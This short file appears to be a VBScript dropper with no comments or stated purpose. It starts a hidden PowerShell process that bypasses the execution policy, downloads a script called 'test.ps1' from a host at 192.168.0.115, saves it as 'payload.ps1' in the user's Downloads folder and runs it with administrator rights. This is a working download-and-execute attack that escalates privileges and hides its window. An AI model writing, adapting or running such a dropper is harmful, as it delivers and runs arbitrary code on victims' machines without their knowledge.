Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -Command ""$path = Join-Path $env:USERPROFILE 'Downloads\payload.ps1'; curl -o $path http://192.168.0.115:8000/test.ps1; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass', '-File', $path -Verb RunAs""", 0, False
